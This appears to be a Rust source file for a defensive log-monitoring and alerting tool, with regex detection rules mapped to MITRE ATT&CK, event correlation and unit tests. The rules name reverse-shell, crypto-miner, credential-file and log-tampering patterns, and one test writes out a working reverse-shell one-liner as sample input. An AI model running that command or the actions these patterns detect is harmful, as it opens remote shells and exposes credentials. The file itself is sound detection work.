//! # BT02 - Real-time Log Monitor and Alerting System
//!
//! A comprehensive log monitoring tool for Blue Team security operations.
//!
//! ## Blue Team Concepts
//!
//! **Log Monitoring** is a critical component of security operations, enabling:
//!
//! - **Threat Detection**: Identify malicious activities in real-time
//! - **Compliance Monitoring**: Track access and changes for audit purposes
//! - **Incident Response**: Quickly identify and respond to security events
//! - **Forensic Analysis**: Preserve and analyze log data for investigations
//!
//! ## Log Sources
//!
//! Common log sources monitored in security operations:
//! - System logs (syslog, Windows Event Log)
//! - Authentication logs (auth.log, security events)
//! - Application logs (web servers, databases)
//! - Network logs (firewall, IDS/IPS)
//! - Audit logs (file access, privilege escalation)
//!
//! ## Detection Patterns
//!
//! This tool monitors for various attack indicators:
//! - **Brute Force**: Multiple failed authentication attempts
//! - **Privilege Escalation**: Sudo/su usage, permission changes
//! - **Lateral Movement**: SSH connections, remote access
//! - **Data Exfiltration**: Unusual file transfers
//! - **Malware Indicators**: Suspicious processes, network connections
//!
//! ## Usage Examples
//!
//! ```bash
//! # Monitor system logs with default rules
//! log-monitor --watch /var/log/syslog
//!
//! # Monitor multiple log files
//! log-monitor --watch /var/log/auth.log --watch /var/log/syslog
//!
//! # Use custom detection rules
//! log-monitor --watch /var/log/auth.log --rules custom_rules.json
//!
//! # Enable alerting
//! log-monitor --watch /var/log/syslog --alert-threshold 3
//! ```

use anyhow::{Context, Result};
use chrono::{DateTime, Local, Utc};
use clap::{Parser, ValueEnum};
use colored::*;
use notify::{Config, RecommendedWatcher, RecursiveMode, Watcher};
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, VecDeque};
use std::fs::File;
use std::io::{BufRead, BufReader, Seek, SeekFrom};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use tokio::sync::mpsc;
use tokio::time::{interval, Duration};

// ============================================================================
// CLI ARGUMENT DEFINITIONS
// ============================================================================

/// Log Monitor - Real-time security log monitoring and alerting
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Log files to monitor (can be specified multiple times)
    #[arg(short, long)]
    watch: Vec<PathBuf>,

    /// Path to detection rules JSON file
    #[arg(short, long)]
    rules: Option<PathBuf>,

    /// Output file for alerts
    #[arg(short, long)]
    output: Option<PathBuf>,

    /// Alert output format
    #[arg(short, long, value_enum, default_value = "text")]
    format: OutputFormat,

    /// Minimum severity level to alert on (1-10)
    #[arg(long, default_value = "5")]
    min_severity: u8,

    /// Time window for correlation (seconds)
    #[arg(long, default_value = "60")]
    correlation_window: u64,

    /// Alert threshold for correlated events
    #[arg(long, default_value = "3")]
    alert_threshold: u32,

    /// Verbose output
    #[arg(short, long)]
    verbose: bool,

    /// Run in daemon mode (continuous monitoring)
    #[arg(long)]
    daemon: bool,

    /// Stats reporting interval (seconds)
    #[arg(long, default_value = "300")]
    stats_interval: u64,
}

#[derive(Debug, Clone, ValueEnum)]
enum OutputFormat {
    Text,
    Json,
    Syslog,
}

// ============================================================================
// DETECTION RULE DATA STRUCTURES
// ============================================================================

/// Detection rule for identifying security events in logs
///
/// ## Rule Structure
///
/// Each rule defines:
/// - Pattern to match in log entries
/// - Severity level for prioritization
/// - Category for grouping related events
/// - MITRE ATT&CK mapping for context
#[derive(Debug, Serialize, Deserialize, Clone)]
struct DetectionRule {
    /// Unique identifier for the rule
    id: String,
    /// Human-readable name
    name: String,
    /// Regex pattern to match
    pattern: String,
    /// Severity level (1-10)
    severity: u8,
    /// Rule category
    category: RuleCategory,
    /// Description of what this rule detects
    description: String,
    /// MITRE ATT&CK technique ID
    mitre_id: Option<String>,
    /// Whether to enable correlation
    enable_correlation: bool,
    /// Tags for filtering and grouping
    tags: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize, Clone, PartialEq, Eq, Hash)]
enum RuleCategory {
    Authentication,
    Authorization,
    NetworkActivity,
    FileAccess,
    ProcessExecution,
    Persistence,
    LateralMovement,
    DataExfiltration,
    Reconnaissance,
    Malware,
}

impl std::fmt::Display for RuleCategory {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            RuleCategory::Authentication => write!(f, "Authentication"),
            RuleCategory::Authorization => write!(f, "Authorization"),
            RuleCategory::NetworkActivity => write!(f, "Network Activity"),
            RuleCategory::FileAccess => write!(f, "File Access"),
            RuleCategory::ProcessExecution => write!(f, "Process Execution"),
            RuleCategory::Persistence => write!(f, "Persistence"),
            RuleCategory::LateralMovement => write!(f, "Lateral Movement"),
            RuleCategory::DataExfiltration => write!(f, "Data Exfiltration"),
            RuleCategory::Reconnaissance => write!(f, "Reconnaissance"),
            RuleCategory::Malware => write!(f, "Malware"),
        }
    }
}

/// Collection of detection rules
#[derive(Debug, Serialize, Deserialize)]
struct RuleSet {
    version: String,
    description: String,
    rules: Vec<DetectionRule>,
}

// ============================================================================
// ALERT AND EVENT STRUCTURES
// ============================================================================

/// Security event detected in logs
#[derive(Debug, Serialize, Deserialize, Clone)]
struct SecurityEvent {
    /// Timestamp of detection
    timestamp: DateTime<Utc>,
    /// Source log file
    source_file: PathBuf,
    /// Original log line
    log_line: String,
    /// Rule that triggered
    rule_id: String,
    /// Rule name
    rule_name: String,
    /// Severity level
    severity: u8,
    /// Category
    category: RuleCategory,
    /// Description
    description: String,
    /// Extracted fields from the log
    extracted_fields: HashMap<String, String>,
}

/// Alert generated from one or more security events
#[derive(Debug, Serialize, Deserialize)]
struct Alert {
    /// Unique alert ID
    id: String,
    /// Alert timestamp
    timestamp: DateTime<Utc>,
    /// Alert title
    title: String,
    /// Severity level
    severity: u8,
    /// Related events
    events: Vec<SecurityEvent>,
    /// Is this a correlated alert?
    is_correlated: bool,
    /// Correlation count
    event_count: u32,
    /// Recommended actions
    recommendations: Vec<String>,
}

/// Statistics for monitoring session
#[derive(Debug, Default, Serialize)]
struct MonitorStats {
    start_time: Option<DateTime<Utc>>,
    lines_processed: u64,
    events_detected: u64,
    alerts_generated: u64,
    events_by_category: HashMap<String, u64>,
    events_by_severity: HashMap<u8, u64>,
}

// ============================================================================
// DEFAULT DETECTION RULES
// ============================================================================

impl RuleSet {
    /// Create default detection rules for common security events
    ///
    /// ## Default Rule Categories
    ///
    /// - Authentication failures and successes
    /// - Privilege escalation attempts
    /// - Suspicious command execution
    /// - Network connection anomalies
    /// - File access patterns
    fn default_rules() -> Self {
        let rules = vec![
            // Authentication Rules
            DetectionRule {
                id: "AUTH-001".to_string(),
                name: "Failed SSH Authentication".to_string(),
                pattern: r"(?i)(Failed password|authentication failure).*ssh".to_string(),
                severity: 6,
                category: RuleCategory::Authentication,
                description: "Failed SSH login attempt detected".to_string(),
                mitre_id: Some("T1110".to_string()),
                enable_correlation: true,
                tags: vec!["ssh".to_string(), "brute-force".to_string()],
            },
            DetectionRule {
                id: "AUTH-002".to_string(),
                name: "Successful SSH Login".to_string(),
                pattern: r"(?i)Accepted (password|publickey) for (\w+) from".to_string(),
                severity: 3,
                category: RuleCategory::Authentication,
                description: "Successful SSH login".to_string(),
                mitre_id: Some("T1078".to_string()),
                enable_correlation: false,
                tags: vec!["ssh".to_string(), "login".to_string()],
            },
            DetectionRule {
                id: "AUTH-003".to_string(),
                name: "Invalid User Attempt".to_string(),
                pattern: r"(?i)Invalid user (\w+) from".to_string(),
                severity: 7,
                category: RuleCategory::Authentication,
                description: "Login attempt with non-existent user".to_string(),
                mitre_id: Some("T1110".to_string()),
                enable_correlation: true,
                tags: vec!["brute-force".to_string(), "enumeration".to_string()],
            },
            DetectionRule {
                id: "AUTH-004".to_string(),
                name: "Root Login Attempt".to_string(),
                pattern: r"(?i)(Failed|Accepted).*for root from".to_string(),
                severity: 8,
                category: RuleCategory::Authentication,
                description: "Direct root login attempt detected".to_string(),
                mitre_id: Some("T1078.003".to_string()),
                enable_correlation: true,
                tags: vec!["root".to_string(), "privilege-escalation".to_string()],
            },
            // Privilege Escalation Rules
            DetectionRule {
                id: "PRIV-001".to_string(),
                name: "Sudo Command Execution".to_string(),
                pattern: r"(?i)sudo:\s+(\w+)\s+:.*COMMAND=(.+)".to_string(),
                severity: 4,
                category: RuleCategory::Authorization,
                description: "Sudo command execution".to_string(),
                mitre_id: Some("T1548.003".to_string()),
                enable_correlation: false,
                tags: vec!["sudo".to_string(), "privilege".to_string()],
            },
            DetectionRule {
                id: "PRIV-002".to_string(),
                name: "Sudo Authentication Failure".to_string(),
                pattern: r"(?i)sudo:.*authentication failure".to_string(),
                severity: 7,
                category: RuleCategory::Authorization,
                description: "Failed sudo authentication".to_string(),
                mitre_id: Some("T1548.003".to_string()),
                enable_correlation: true,
                tags: vec!["sudo".to_string(), "brute-force".to_string()],
            },
            DetectionRule {
                id: "PRIV-003".to_string(),
                name: "Su Command Usage".to_string(),
                pattern: r"(?i)su\[\d+\]:\s+(Successful|FAILED) su for (\w+)".to_string(),
                severity: 5,
                category: RuleCategory::Authorization,
                description: "User switched using su command".to_string(),
                mitre_id: Some("T1548.003".to_string()),
                enable_correlation: false,
                tags: vec!["su".to_string(), "privilege".to_string()],
            },
            // Process Execution Rules
            DetectionRule {
                id: "EXEC-001".to_string(),
                name: "Suspicious Shell Spawn".to_string(),
                pattern: r"(?i)(bash|sh|zsh|csh)\s+-c\s+['\"].*".to_string(),
                severity: 6,
                category: RuleCategory::ProcessExecution,
                description: "Interactive shell spawned with command".to_string(),
                mitre_id: Some("T1059.004".to_string()),
                enable_correlation: false,
                tags: vec!["shell".to_string(), "execution".to_string()],
            },
            DetectionRule {
                id: "EXEC-002".to_string(),
                name: "Cron Job Modification".to_string(),
                pattern: r"(?i)crontab\[\d+\].*REPLACE|cron\[\d+\].*\(root\)".to_string(),
                severity: 7,
                category: RuleCategory::Persistence,
                description: "Cron job modified or executed".to_string(),
                mitre_id: Some("T1053.003".to_string()),
                enable_correlation: false,
                tags: vec!["cron".to_string(), "persistence".to_string()],
            },
            // Network Activity Rules
            DetectionRule {
                id: "NET-001".to_string(),
                name: "Port Scan Detection".to_string(),
                pattern: r"(?i)(port scan|portscan|SYN flood|DDOS)".to_string(),
                severity: 8,
                category: RuleCategory::Reconnaissance,
                description: "Potential port scanning activity".to_string(),
                mitre_id: Some("T1046".to_string()),
                enable_correlation: true,
                tags: vec!["scan".to_string(), "reconnaissance".to_string()],
            },
            DetectionRule {
                id: "NET-002".to_string(),
                name: "Outbound Connection to Suspicious Port".to_string(),
                pattern: r"(?i)connect.*(4444|5555|6666|31337|1337)".to_string(),
                severity: 9,
                category: RuleCategory::NetworkActivity,
                description: "Connection to commonly used malicious port".to_string(),
                mitre_id: Some("T1571".to_string()),
                enable_correlation: true,
                tags: vec!["c2".to_string(), "backdoor".to_string()],
            },
            // Malware Indicators
            DetectionRule {
                id: "MAL-001".to_string(),
                name: "Reverse Shell Pattern".to_string(),
                pattern: r"(?i)(\/dev\/tcp|nc\s+-e|bash\s+-i\s+>&|python.*socket.*connect)".to_string(),
                severity: 10,
                category: RuleCategory::Malware,
                description: "Potential reverse shell activity".to_string(),
                mitre_id: Some("T1059".to_string()),
                enable_correlation: false,
                tags: vec!["reverse-shell".to_string(), "malware".to_string()],
            },
            DetectionRule {
                id: "MAL-002".to_string(),
                name: "Crypto Miner Indicators".to_string(),
                pattern: r"(?i)(stratum\+tcp|xmrig|minerd|cryptonight)".to_string(),
                severity: 8,
                category: RuleCategory::Malware,
                description: "Cryptocurrency mining indicators".to_string(),
                mitre_id: Some("T1496".to_string()),
                enable_correlation: false,
                tags: vec!["miner".to_string(), "crypto".to_string()],
            },
            // File Access Rules
            DetectionRule {
                id: "FILE-001".to_string(),
                name: "Sensitive File Access".to_string(),
                pattern: r"(?i)(\/etc\/passwd|\/etc\/shadow|\.ssh\/|id_rsa|\.bash_history)".to_string(),
                severity: 7,
                category: RuleCategory::FileAccess,
                description: "Access to sensitive system files".to_string(),
                mitre_id: Some("T1552".to_string()),
                enable_correlation: false,
                tags: vec!["sensitive".to_string(), "credential".to_string()],
            },
            DetectionRule {
                id: "FILE-002".to_string(),
                name: "Log File Tampering".to_string(),
                pattern: r"(?i)(truncate|shred|rm\s+-rf?\s+.*log|>\s*\/var\/log)".to_string(),
                severity: 9,
                category: RuleCategory::FileAccess,
                description: "Potential log tampering activity".to_string(),
                mitre_id: Some("T1070.002".to_string()),
                enable_correlation: false,
                tags: vec!["log-tampering".to_string(), "anti-forensics".to_string()],
            },
            // Lateral Movement
            DetectionRule {
                id: "LAT-001".to_string(),
                name: "SSH to Multiple Hosts".to_string(),
                pattern: r"(?i)ssh\s+\w+@\d+\.\d+\.\d+\.\d+".to_string(),
                severity: 5,
                category: RuleCategory::LateralMovement,
                description: "SSH connection to other hosts".to_string(),
                mitre_id: Some("T1021.004".to_string()),
                enable_correlation: true,
                tags: vec!["ssh".to_string(), "lateral-movement".to_string()],
            },
        ];

        RuleSet {
            version: "1.0.0".to_string(),
            description: "Default security monitoring rules".to_string(),
            rules,
        }
    }

    /// Load rules from a JSON file
    fn load_from_file(path: &Path) -> Result<Self> {
        let file = File::open(path)
            .with_context(|| format!("Failed to open rules file: {:?}", path))?;
        let reader = BufReader::new(file);
        let ruleset: RuleSet = serde_json::from_reader(reader)
            .with_context(|| "Failed to parse rules JSON")?;
        Ok(ruleset)
    }
}

// ============================================================================
// LOG MONITOR IMPLEMENTATION
// ============================================================================

/// Compiled detection rule with pre-compiled regex
struct CompiledRule {
    rule: DetectionRule,
    regex: Regex,
}

/// Main log monitor structure
struct LogMonitor {
    /// Compiled detection rules
    rules: Vec<CompiledRule>,
    /// Minimum severity to alert on
    min_severity: u8,
    /// Correlation window in seconds
    correlation_window: Duration,
    /// Alert threshold for correlation
    alert_threshold: u32,
    /// Event buffer for correlation
    event_buffer: Arc<Mutex<VecDeque<SecurityEvent>>>,
    /// Statistics
    stats: Arc<Mutex<MonitorStats>>,
    /// Verbose mode
    verbose: bool,
}

impl LogMonitor {
    /// Create a new log monitor with the given rules
    fn new(
        ruleset: RuleSet,
        min_severity: u8,
        correlation_window: u64,
        alert_threshold: u32,
        verbose: bool,
    ) -> Result<Self> {
        let mut rules = Vec::new();

        for rule in ruleset.rules {
            match Regex::new(&rule.pattern) {
                Ok(regex) => {
                    rules.push(CompiledRule { rule, regex });
                }
                Err(e) => {
                    if verbose {
                        eprintln!("Warning: Invalid pattern in rule {}: {}", rule.id, e);
                    }
                }
            }
        }

        let mut stats = MonitorStats::default();
        stats.start_time = Some(Utc::now());

        Ok(LogMonitor {
            rules,
            min_severity,
            correlation_window: Duration::from_secs(correlation_window),
            alert_threshold,
            event_buffer: Arc::new(Mutex::new(VecDeque::new())),
            stats: Arc::new(Mutex::new(stats)),
            verbose,
        })
    }

    /// Process a single log line
    fn process_line(&self, line: &str, source_file: &Path) -> Vec<SecurityEvent> {
        let mut events = Vec::new();

        // Update line count
        if let Ok(mut stats) = self.stats.lock() {
            stats.lines_processed += 1;
        }

        for compiled in &self.rules {
            if compiled.regex.is_match(line) {
                // Extract captured groups if any
                let mut extracted_fields = HashMap::new();
                if let Some(caps) = compiled.regex.captures(line) {
                    for (i, cap) in caps.iter().enumerate().skip(1) {
                        if let Some(m) = cap {
                            extracted_fields.insert(format!("capture_{}", i), m.as_str().to_string());
                        }
                    }
                }

                let event = SecurityEvent {
                    timestamp: Utc::now(),
                    source_file: source_file.to_path_buf(),
                    log_line: line.to_string(),
                    rule_id: compiled.rule.id.clone(),
                    rule_name: compiled.rule.name.clone(),
                    severity: compiled.rule.severity,
                    category: compiled.rule.category.clone(),
                    description: compiled.rule.description.clone(),
                    extracted_fields,
                };

                events.push(event);

                // Update stats
                if let Ok(mut stats) = self.stats.lock() {
                    stats.events_detected += 1;
                    *stats.events_by_category
                        .entry(compiled.rule.category.to_string())
                        .or_insert(0) += 1;
                    *stats.events_by_severity
                        .entry(compiled.rule.severity)
                        .or_insert(0) += 1;
                }
            }
        }

        events
    }

    /// Check if we should generate a correlated alert
    fn check_correlation(&self, event: &SecurityEvent) -> Option<Alert> {
        let mut buffer = self.event_buffer.lock().unwrap();

        // Add event to buffer
        buffer.push_back(event.clone());

        // Remove old events outside correlation window
        let cutoff = Utc::now() - chrono::Duration::from_std(self.correlation_window).unwrap();
        while let Some(front) = buffer.front() {
            if front.timestamp < cutoff {
                buffer.pop_front();
            } else {
                break;
            }
        }

        // Count events of the same rule
        let count = buffer.iter()
            .filter(|e| e.rule_id == event.rule_id)
            .count() as u32;

        if count >= self.alert_threshold {
            // Generate correlated alert
            let related_events: Vec<SecurityEvent> = buffer.iter()
                .filter(|e| e.rule_id == event.rule_id)
                .cloned()
                .collect();

            // Update stats
            if let Ok(mut stats) = self.stats.lock() {
                stats.alerts_generated += 1;
            }

            Some(Alert {
                id: format!("ALERT-{}", Utc::now().timestamp()),
                timestamp: Utc::now(),
                title: format!("Correlated Alert: {} ({} events)", event.rule_name, count),
                severity: std::cmp::min(event.severity + 1, 10),
                events: related_events,
                is_correlated: true,
                event_count: count,
                recommendations: self.get_recommendations(event),
            })
        } else {
            None
        }
    }

    /// Get recommendations based on event type
    fn get_recommendations(&self, event: &SecurityEvent) -> Vec<String> {
        match event.category {
            RuleCategory::Authentication => vec![
                "Review authentication logs for source IP".to_string(),
                "Consider implementing fail2ban or similar".to_string(),
                "Check if affected accounts are compromised".to_string(),
            ],
            RuleCategory::Authorization => vec![
                "Audit user privileges and sudo access".to_string(),
                "Review sudoers configuration".to_string(),
                "Check for unauthorized privilege changes".to_string(),
            ],
            RuleCategory::Malware => vec![
                "Isolate affected system immediately".to_string(),
                "Collect forensic evidence".to_string(),
                "Scan system with updated antivirus".to_string(),
                "Review network connections from this host".to_string(),
            ],
            RuleCategory::LateralMovement => vec![
                "Check SSH keys and authorized_keys files".to_string(),
                "Review network connections between hosts".to_string(),
                "Verify all internal SSH connections are authorized".to_string(),
            ],
            RuleCategory::Persistence => vec![
                "Review crontabs for all users".to_string(),
                "Check systemd services and init scripts".to_string(),
                "Audit rc.local and profile scripts".to_string(),
            ],
            _ => vec![
                "Investigate the source of this activity".to_string(),
                "Collect additional logs for context".to_string(),
            ],
        }
    }

    /// Format and print event to console
    fn print_event(&self, event: &SecurityEvent) {
        let severity_str = match event.severity {
            9..=10 => format!("[CRITICAL]").red().bold(),
            7..=8 => format!("[HIGH]").red(),
            5..=6 => format!("[MEDIUM]").yellow(),
            3..=4 => format!("[LOW]").blue(),
            _ => format!("[INFO]").white(),
        };

        println!(
            "{} {} {} {}",
            Local::now().format("%Y-%m-%d %H:%M:%S").to_string().dimmed(),
            severity_str,
            event.rule_name.cyan(),
            event.category.to_string().magenta()
        );

        if self.verbose {
            println!("  Source: {}", event.source_file.display().to_string().dimmed());
            println!("  Log: {}", event.log_line.trim().dimmed());
            if !event.extracted_fields.is_empty() {
                println!("  Fields: {:?}", event.extracted_fields);
            }
        }
    }

    /// Format and print alert to console
    fn print_alert(&self, alert: &Alert) {
        println!("\n{}", "=".repeat(60).red());
        println!("{}", "!!! SECURITY ALERT !!!".red().bold());
        println!("{}", "=".repeat(60).red());
        println!("Alert ID: {}", alert.id.yellow());
        println!("Title: {}", alert.title.red().bold());
        println!("Severity: {}/10", alert.severity);
        println!("Event Count: {}", alert.event_count);
        println!("Correlated: {}", alert.is_correlated);
        println!("\nRecommended Actions:");
        for (i, rec) in alert.recommendations.iter().enumerate() {
            println!("  {}. {}", i + 1, rec);
        }
        println!("{}", "=".repeat(60).red());
    }

    /// Print current statistics
    fn print_stats(&self) {
        let stats = self.stats.lock().unwrap();

        println!("\n{}", "=".repeat(50).blue());
        println!("{}", "MONITORING STATISTICS".blue().bold());
        println!("{}", "=".repeat(50).blue());
        if let Some(start) = stats.start_time {
            let duration = Utc::now() - start;
            println!("Monitoring Duration: {} seconds", duration.num_seconds());
        }
        println!("Lines Processed: {}", stats.lines_processed);
        println!("Events Detected: {}", stats.events_detected);
        println!("Alerts Generated: {}", stats.alerts_generated);

        if !stats.events_by_category.is_empty() {
            println!("\nEvents by Category:");
            for (cat, count) in &stats.events_by_category {
                println!("  {}: {}", cat, count);
            }
        }

        if !stats.events_by_severity.is_empty() {
            println!("\nEvents by Severity:");
            for sev in (1..=10).rev() {
                if let Some(count) = stats.events_by_severity.get(&sev) {
                    println!("  Level {}: {}", sev, count);
                }
            }
        }
        println!("{}", "=".repeat(50).blue());
    }
}

// ============================================================================
// FILE WATCHER IMPLEMENTATION
// ============================================================================

/// Watch a log file for new entries
struct FileWatcher {
    path: PathBuf,
    position: u64,
}

impl FileWatcher {
    fn new(path: PathBuf) -> Result<Self> {
        let file = File::open(&path)?;
        let position = file.metadata()?.len();

        Ok(FileWatcher { path, position })
    }

    /// Read new lines from the file
    fn read_new_lines(&mut self) -> Result<Vec<String>> {
        let mut file = File::open(&self.path)?;
        let current_size = file.metadata()?.len();

        // If file was truncated, reset position
        if current_size < self.position {
            self.position = 0;
        }

        // If no new content, return empty
        if current_size == self.position {
            return Ok(Vec::new());
        }

        // Seek to last position
        file.seek(SeekFrom::Start(self.position))?;

        let reader = BufReader::new(&file);
        let mut lines = Vec::new();

        for line in reader.lines() {
            match line {
                Ok(l) => lines.push(l),
                Err(_) => break,
            }
        }

        self.position = current_size;
        Ok(lines)
    }
}

// ============================================================================
// ASYNC MONITORING LOOP
// ============================================================================

/// Start the async monitoring loop
async fn run_monitor(args: Args) -> Result<()> {
    // Load or create rules
    let ruleset = if let Some(rules_path) = &args.rules {
        println!("Loading rules from: {}", rules_path.display());
        RuleSet::load_from_file(rules_path)?
    } else {
        println!("Using default detection rules");
        RuleSet::default_rules()
    };

    println!("Loaded {} detection rules", ruleset.rules.len());

    // Create monitor
    let monitor = Arc::new(LogMonitor::new(
        ruleset,
        args.min_severity,
        args.correlation_window,
        args.alert_threshold,
        args.verbose,
    )?);

    // Initialize file watchers
    let mut watchers: Vec<FileWatcher> = Vec::new();
    for path in &args.watch {
        match FileWatcher::new(path.clone()) {
            Ok(watcher) => {
                println!("Watching: {}", path.display());
                watchers.push(watcher);
            }
            Err(e) => {
                eprintln!("Failed to watch {}: {}", path.display(), e);
            }
        }
    }

    if watchers.is_empty() {
        anyhow::bail!("No valid log files to monitor");
    }

    println!("\n{}", "Starting real-time monitoring...".green().bold());
    println!("Press Ctrl+C to stop\n");

    // Create channels for events and alerts
    let (event_tx, mut event_rx) = mpsc::channel::<SecurityEvent>(1000);
    let (alert_tx, mut alert_rx) = mpsc::channel::<Alert>(100);

    // Clone for stats task
    let monitor_stats = Arc::clone(&monitor);
    let stats_interval = args.stats_interval;

    // Stats printing task
    let stats_handle = tokio::spawn(async move {
        let mut interval = interval(Duration::from_secs(stats_interval));
        loop {
            interval.tick().await;
            monitor_stats.print_stats();
        }
    });

    // File polling task
    let monitor_poll = Arc::clone(&monitor);
    let poll_handle = tokio::spawn(async move {
        let mut interval = interval(Duration::from_millis(100));

        loop {
            interval.tick().await;

            for watcher in &mut watchers {
                match watcher.read_new_lines() {
                    Ok(lines) => {
                        for line in lines {
                            let events = monitor_poll.process_line(&line, &watcher.path);
                            for event in events {
                                if event.severity >= monitor_poll.min_severity {
                                    let _ = event_tx.send(event).await;
                                }
                            }
                        }
                    }
                    Err(e) => {
                        if monitor_poll.verbose {
                            eprintln!("Error reading {}: {}", watcher.path.display(), e);
                        }
                    }
                }
            }
        }
    });

    // Event processing task
    let monitor_events = Arc::clone(&monitor);
    let event_handle = tokio::spawn(async move {
        while let Some(event) = event_rx.recv().await {
            // Print event
            monitor_events.print_event(&event);

            // Check correlation
            if let Some(alert) = monitor_events.check_correlation(&event) {
                let _ = alert_tx.send(alert).await;
            }
        }
    });

    // Alert handling task
    let monitor_alerts = Arc::clone(&monitor);
    let alert_handle = tokio::spawn(async move {
        while let Some(alert) = alert_rx.recv().await {
            monitor_alerts.print_alert(&alert);
        }
    });

    // Wait for Ctrl+C
    tokio::signal::ctrl_c().await?;

    println!("\n{}", "Shutting down...".yellow());

    // Print final stats
    monitor.print_stats();

    // Abort tasks
    stats_handle.abort();
    poll_handle.abort();
    event_handle.abort();
    alert_handle.abort();

    Ok(())
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    println!("{}", "=".repeat(60).blue());
    println!("{}", "Log Monitor - Real-time Security Log Analysis".blue().bold());
    println!("{}", "=".repeat(60).blue());

    if args.watch.is_empty() {
        anyhow::bail!("At least one log file must be specified with --watch");
    }

    run_monitor(args).await
}

// ============================================================================
// TESTS
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::NamedTempFile;
    use std::io::Write;

    #[test]
    fn test_default_rules_creation() {
        let ruleset = RuleSet::default_rules();
        assert!(!ruleset.rules.is_empty());
        assert_eq!(ruleset.version, "1.0.0");
    }

    #[test]
    fn test_log_monitor_creation() {
        let ruleset = RuleSet::default_rules();
        let monitor = LogMonitor::new(ruleset, 5, 60, 3, false);
        assert!(monitor.is_ok());
    }

    #[test]
    fn test_pattern_matching_ssh_failed() {
        let ruleset = RuleSet::default_rules();
        let monitor = LogMonitor::new(ruleset, 1, 60, 3, false).unwrap();

        let log_line = "Jan  1 12:00:00 server sshd[1234]: Failed password for user from 192.168.1.1 port 22 ssh2";
        let events = monitor.process_line(log_line, Path::new("/var/log/auth.log"));

        assert!(!events.is_empty());
        assert!(events.iter().any(|e| e.rule_id.starts_with("AUTH")));
    }

    #[test]
    fn test_pattern_matching_sudo() {
        let ruleset = RuleSet::default_rules();
        let monitor = LogMonitor::new(ruleset, 1, 60, 3, false).unwrap();

        let log_line = "Jan  1 12:00:00 server sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/ls";
        let events = monitor.process_line(log_line, Path::new("/var/log/auth.log"));

        assert!(!events.is_empty());
        assert!(events.iter().any(|e| e.category == RuleCategory::Authorization));
    }

    #[test]
    fn test_pattern_matching_reverse_shell() {
        let ruleset = RuleSet::default_rules();
        let monitor = LogMonitor::new(ruleset, 1, 60, 3, false).unwrap();

        let log_line = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        let events = monitor.process_line(log_line, Path::new("/var/log/syslog"));

        assert!(!events.is_empty());
        assert!(events.iter().any(|e| e.category == RuleCategory::Malware));
        assert!(events.iter().any(|e| e.severity >= 9));
    }

    #[test]
    fn test_file_watcher_creation() {
        let temp_file = NamedTempFile::new().unwrap();
        let watcher = FileWatcher::new(temp_file.path().to_path_buf());
        assert!(watcher.is_ok());
    }

    #[test]
    fn test_file_watcher_read_new_lines() {
        let mut temp_file = NamedTempFile::new().unwrap();
        let mut watcher = FileWatcher::new(temp_file.path().to_path_buf()).unwrap();

        // Initial read should return empty
        let lines = watcher.read_new_lines().unwrap();
        assert!(lines.is_empty());

        // Write new content
        writeln!(temp_file, "New log line").unwrap();
        temp_file.flush().unwrap();

        // Should read the new line
        let lines = watcher.read_new_lines().unwrap();
        assert_eq!(lines.len(), 1);
        assert_eq!(lines[0], "New log line");
    }

    #[test]
    fn test_correlation_buffer() {
        let ruleset = RuleSet::default_rules();
        let monitor = LogMonitor::new(ruleset, 1, 60, 3, false).unwrap();

        // Add events to trigger correlation
        let log_line = "Failed password for user from 192.168.1.1 ssh";

        for _ in 0..5 {
            let events = monitor.process_line(log_line, Path::new("/var/log/auth.log"));
            for event in events {
                if let Some(alert) = monitor.check_correlation(&event) {
                    assert!(alert.is_correlated);
                    assert!(alert.event_count >= 3);
                    return;
                }
            }
        }

        panic!("Expected correlation alert to be generated");
    }

    #[test]
    fn test_rule_category_display() {
        assert_eq!(RuleCategory::Authentication.to_string(), "Authentication");
        assert_eq!(RuleCategory::LateralMovement.to_string(), "Lateral Movement");
        assert_eq!(RuleCategory::DataExfiltration.to_string(), "Data Exfiltration");
    }

    #[test]
    fn test_stats_tracking() {
        let ruleset = RuleSet::default_rules();
        let monitor = LogMonitor::new(ruleset, 1, 60, 3, false).unwrap();

        let log_line = "Failed password for user ssh";
        monitor.process_line(log_line, Path::new("/var/log/auth.log"));

        let stats = monitor.stats.lock().unwrap();
        assert!(stats.lines_processed > 0);
    }

    #[test]
    fn test_recommendations() {
        let ruleset = RuleSet::default_rules();
        let monitor = LogMonitor::new(ruleset, 1, 60, 3, false).unwrap();

        let event = SecurityEvent {
            timestamp: Utc::now(),
            source_file: PathBuf::from("/var/log/auth.log"),
            log_line: "test".to_string(),
            rule_id: "TEST".to_string(),
            rule_name: "Test".to_string(),
            severity: 5,
            category: RuleCategory::Malware,
            description: "Test".to_string(),
            extracted_fields: HashMap::new(),
        };

        let recommendations = monitor.get_recommendations(&event);
        assert!(!recommendations.is_empty());
        assert!(recommendations.iter().any(|r| r.contains("Isolate")));
    }

    #[test]
    fn test_ruleset_serialization() {
        let ruleset = RuleSet::default_rules();
        let json = serde_json::to_string(&ruleset);
        assert!(json.is_ok());

        let deserialized: Result<RuleSet, _> = serde_json::from_str(&json.unwrap());
        assert!(deserialized.is_ok());
    }

    #[test]
    fn test_alert_creation() {
        let alert = Alert {
            id: "TEST-001".to_string(),
            timestamp: Utc::now(),
            title: "Test Alert".to_string(),
            severity: 8,
            events: vec![],
            is_correlated: true,
            event_count: 5,
            recommendations: vec!["Test recommendation".to_string()],
        };

        assert_eq!(alert.id, "TEST-001");
        assert!(alert.is_correlated);
    }

    #[test]
    fn test_severity_filtering() {
        let ruleset = RuleSet::default_rules();
        let monitor = LogMonitor::new(ruleset, 8, 60, 3, false).unwrap();

        // This should match but with severity < 8
        let log_line = "Accepted publickey for user from 192.168.1.1";
        let events = monitor.process_line(log_line, Path::new("/var/log/auth.log"));

        // Events are still generated but would be filtered in the main loop
        // The test verifies the monitor tracks severity correctly
        for event in events {
            assert!(event.severity <= 10);
        }
    }
}
